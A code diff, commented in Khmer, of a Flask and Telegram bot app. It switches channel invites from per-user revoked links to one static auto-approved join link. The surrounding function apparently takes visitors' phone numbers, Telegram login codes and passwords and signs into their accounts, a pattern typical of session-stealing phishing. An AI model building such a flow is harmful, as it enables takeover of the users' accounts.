@@ -20,6 +20,7 @@ else:
     CHANNEL_ID = raw_channel_id
 
 temp_clients = {}
+STATIC_INVITE_LINK = ""  # 🛠 កន្លែងរក្សាទុក Link Invite តែមួយដដែលៗ
 
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
@@ -117,21 +118,8 @@ async def async_verify_code(phone_number, code, password):
         except:
             pass
 
-    # 🛠 បង្កើត Link Invite (Join Requests Required) សម្រាប់ User ម្នាក់ៗដាច់ដោយឡែក
-    invite_link = "https://t.me/"
-    if admin_client and CHANNEL_ID:
-        try:
-            if not admin_client.is_connected:
-                await admin_client.connect()
-            
-            new_link = await admin_client.create_chat_invite_link(
-                chat_id=CHANNEL_ID,
-                creates_join_request=True,
-                name=f"Verify_{me.id}"
-            )
-            invite_link = new_link.invite_link
-        except Exception as e:
-            print(f"Error creating invite link: {e}")
+    # 🛠 ប្រើប្រាស់ Link Invite តែមួយដដែលៗ ដែលបានបង្កើតរួចស្រេចពេល Start App
+    invite_link = STATIC_INVITE_LINK if STATIC_INVITE_LINK else "https://t.me/"
 
     return {
         "success": True,
@@ -140,7 +128,7 @@ async def async_verify_code(phone_number, code, password):
         "redirectUrl": invite_link
     }
 
-# 🛠 Event Listener: Auto-Approve និង Revoke លីងចោលភ្លាមៗពេលមានគេ Join
+# 🛠 Event Listener: Auto-Approve ពេលមានគេ Join (មិនបាច់ Revoke Link ចោលទេ ដើម្បីឱ្យ Link នៅប្រើបានរហូត)
 if admin_client:
     @admin_client.on_chat_join_request()
     async def handle_join_request(client, chat_join_request):
@@ -152,14 +140,12 @@ if admin_client:
 
             user_id = chat_join_request.from_user.id
             
+            # យល់ព្រមឱ្យចូលក្នុង Channel ស្វ័យប្រវត្តិ
             await client.approve_chat_join_request(chat_id, user_id)
-            
-            if chat_join_request.invite_link and chat_join_request.invite_link.invite_link:
-                await client.revoke_chat_invite_link(chat_id, chat_join_request.invite_link.invite_link)
                 
-            print(f"Successfully auto-approved user {user_id} and revoked the invite link.")
+            print(f"Successfully auto-approved user {user_id}.")
         except Exception as e:
-            print(f"Error in auto-approval/revoke: {e}")
+            print(f"Error in auto-approval: {e}")
 
 @app.route('/')
 def index():
@@ -213,7 +199,7 @@ def verify_code():
         return jsonify({"success": False, "error": str(err)}), 400
 
 async def start_admin_client():
-    global CHANNEL_ID
+    global CHANNEL_ID, STATIC_INVITE_LINK
     if admin_client:
         try:
             await admin_client.start()
@@ -231,6 +217,19 @@ async def start_admin_client():
                 chat = await admin_client.get_chat(CHANNEL_ID)
                 CHANNEL_ID = chat.id
                 print(f"Successfully cached channel: {chat.title} ({chat.id})")
+
+            # 🛠 បង្កើត Link Invite តែមួយគត់ (Static Link) ទុកប្រើប្រាស់ពេល App ចាប់ផ្តើមដំណើរការ
+            try:
+                new_link = await admin_client.create_chat_invite_link(
+                    chat_id=CHANNEL_ID,
+                    creates_join_request=True,
+                    name="Main_Permanent_Verify_Link"
+                )
+                STATIC_INVITE_LINK = new_link.invite_link
+                print(f"Successfully created static invite link: {STATIC_INVITE_LINK}")
+            except Exception as e:
+                print(f"Failed to create static invite link: {e}")
+
         except Exception as e:
             print(f"Failed to start admin client or resolve channel: {e}")
 
